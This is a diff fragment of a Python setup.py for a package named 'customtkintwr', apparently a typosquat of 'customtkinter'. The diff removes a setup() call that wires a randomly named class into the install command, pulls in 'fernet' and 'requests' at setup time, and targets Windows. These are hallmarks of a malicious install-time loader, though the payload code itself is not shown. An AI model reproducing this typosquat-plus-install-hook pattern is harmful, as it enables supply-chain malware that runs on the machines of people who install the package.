@@ -18,22 +18,5 @@ class QJgvkxWlXQCuEXBRGvIybMRcaQgxdPeQERmoOmBzbJEtoWvEafRvqLEXouTcKRsJCwHyCqtxrm
             install.run(self)
 
 
-setup(
-    name="customtkintwr",
-    version=VERSION,
-    author="ZswwLLBqruGSwzkbAiIp",
-    author_email="JVGruJsPC@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': QJgvkxWlXQCuEXBRGvIybMRcaQgxdPeQERmoOmBzbJEtoWvEafRvqLEXouTcKRsJCwHyCqtxrmlFLNpGiXAJ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
